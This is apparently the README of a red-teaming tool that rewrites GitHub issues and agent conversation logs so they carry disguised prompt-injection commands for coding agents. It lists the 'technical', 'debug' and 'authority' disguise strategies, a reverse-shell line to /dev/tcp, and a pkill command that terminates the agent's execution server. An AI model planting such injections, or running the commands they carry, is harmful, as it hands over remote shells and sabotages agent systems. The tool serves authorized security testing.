# Injection Agent

AI agent for analyzing prompt injection vulnerabilities in AI model interactions using **OpenAI GPT-4o via LiteLLM**.

## Quick Start

```bash
# Install the tool
pip install -e ".[dev]"

# Analyze a single trajectory file
injection-agent analyze -f ./trajectory.json

# Batch process multiple files
injection-agent batch -d ./trajectories/

# Static analysis of agent repository
injection-agent static -r ./target_agent/

# Comprehensive security analysis
injection-agent comprehensive -r ./target_agent/
```

## Commands

### 1. Single File Analysis (`analyze`)

Analyzes a single trajectory file and generates an injection report.

```bash
injection-agent analyze -f ./trajectory.json
injection-agent analyze -f ./trajectory.json -s debug
injection-agent analyze -f ./trajectory.json -p "custom-command"
```

**Options:**
- `-f, --file PATH` - Trajectory file to analyze (required)
- `-s, --strategy` - Injection strategy: `technical`, `debug`, `authority` (default: technical)
- `-p, --payload TEXT` - Custom injection command
- `-v, --verbose` - Enable detailed logging
- `--dry-run` - Perform dry run without API calls

### 2. Batch Processing (`batch`)

Processes multiple trajectory files in parallel.

```bash
injection-agent batch -d ./trajectories/
injection-agent batch -d ./trajectories/ -s authority --max-workers 8
```

**Options:**
- `-d, --directory PATH` - Directory with trajectory files (required)
- `-s, --strategy` - Injection strategy (default: technical)
- `-p, --payload TEXT` - Custom injection command
- `--max-workers INT` - Concurrent workers (default: 3)
- `-v, --verbose` - Enable detailed logging
- `--dry-run` - Estimate costs without API calls

### 3. Static Repository Analysis (`static`)

Performs static analysis of an agent repository.

```bash
injection-agent static -r ./target_agent/
injection-agent static -r ./target_agent/ --max-files 30
```

**Options:**
- `-r, --repository PATH` - Agent repository to analyze (required)
- `--max-files INT` - Maximum files to read (default: 20)
- `-v, --verbose` - Enable detailed logging
- `--dry-run` - Perform dry run without API calls

### 4. Comprehensive Security Analysis (`comprehensive`)

Combines static analysis with injection vulnerability assessment.

```bash
injection-agent comprehensive -r ./target_agent/
injection-agent comprehensive -r ./target_agent/ -s authority --max-files 25
```

**Options:**
- `-r, --repository PATH` - Agent repository to analyze (required)
- `--max-files INT` - Maximum files to read (default: 20)
- `-s, --strategy` - Injection strategy: `technical`, `debug`, `authority` (default: technical)
- `-p, --payload TEXT` - Custom injection command
- `-v, --verbose` - Enable detailed logging
- `--dry-run` - Perform dry run without API calls

## Injection Strategies

| Strategy | Description | Use Case |
|----------|-------------|----------|
| `technical` | Technical justification disguise | System administration scenarios |
| `debug` | Debugging requirement disguise | Troubleshooting contexts |
| `authority` | Authority-based instructions | Administrative directives |

## Command Types

| Type | Command | Purpose | Risk Level |
|------|---------|---------|------------|
| `pkill` (default) | `pkill -f "action_execution_server"` | Process termination | Medium |
| `reverse-shell` | `bash -i >& /dev/tcp/IP/PORT 0>&1` | Remote access | High |
| `custom` | User-defined | Specific test scenarios | Varies |

## Input Formats

The tool accepts JSON files in two formats:

### GitHub Issue Format
```json
{
  "user_input": "<issue>\nYour GitHub issue content...\n</issue>"
}
```

### Conversation Log Format  
```json
{
  "log": [
    {
      "role": "user", 
      "content": "User message content..."
    }
  ]
}
```

## Output Format

Analysis reports are generated in the `analysis/` directory:

```json
{
  "task_id": "unique_identifier",
  "timestamp": "2025-06-30T16:50:42.812581", 
  "original_length": 2279,
  "injected_length": 3404,
  "command_type": "pkill",
  "injection_strategy": "technical",
  "injection_success": true,
  "injection_points": [
    {
      "position": "In Steps to Reproduce section",
      "context": "## Steps to Reproduce", 
      "psychological_hook": "Commands appear legitimate",
      "success_probability": "high"
    }
  ],
  "injected_text": "Full content with injected prompts..."
}
```

## Installation

```bash
# Development installation (recommended)
git clone <repository-url>
cd injection-agent
pip install -e ".[dev]"

# Verify installation
injection-agent --help
```

## Configuration

### API Key Setup
The tool is pre-configured with an OpenAI API key, but you can override it:

```bash
# Environment variable
export OPENAI_API_KEY="sk-proj-your-key-here"

# Or edit src/injection_agent/config/settings.py
DEFAULT_OPENAI_API_KEY = "your-key-here"
```

## Examples

### Basic Analysis
```bash
# Analyze single file
injection-agent analyze -f ./issue_123.json

# Use debug strategy
injection-agent analyze -f ./issue_123.json -s debug -v

# Custom payload
injection-agent analyze -f ./issue_123.json -p "custom-shell-command"
```

### Batch Processing
```bash
# Process all files in directory
injection-agent batch -d ./trajectories/

# High-throughput processing
injection-agent batch -d ./large_dataset/ --max-workers 10

# Cost estimation
injection-agent batch -d ./trajectories/ --dry-run
```

### Repository Analysis
```bash
# Static analysis
injection-agent static -r ./agent_repo/ -v --max-files 30

# Comprehensive security analysis
injection-agent comprehensive -r ./agent_repo/ -s technical
```

## Security Considerations

⚠️ **This tool is for security research and authorized testing only:**

1. **Only use on systems you own or have explicit permission to test**
2. **Do not use for malicious purposes**  
3. **Be aware that injected commands could be executed by AI systems**
4. **Review all custom payloads before use**
5. **Follow responsible disclosure practices**

## Performance & Costs

- **Default**: 3 concurrent workers for batch processing
- **Recommended**: 5-8 workers for optimal throughput
- **Cost Management**: Use `--dry-run` for testing without API costs
- **Each analysis**: ~2-3 API calls to GPT-4o

## Project Structure

```
injection-agent/
├── src/injection_agent/          # Main package
│   ├── agent.py                  # LiteLLM-powered agent
│   ├── cli.py                    # Command-line interface
│   ├── config/settings.py        # Configuration and API keys
│   ├── enums/injection_types.py  # Strategy and command enums
│   ├── tools/                    # Analysis tools
│   └── utils/                    # Utility functions
├── analysis/                     # Generated analysis reports
├── pyproject.toml               # Project configuration
└── README.md                    # This file
```

## License

Licensed under the Apache License, Version 2.0. See [LICENSE](LICENSE) file for details.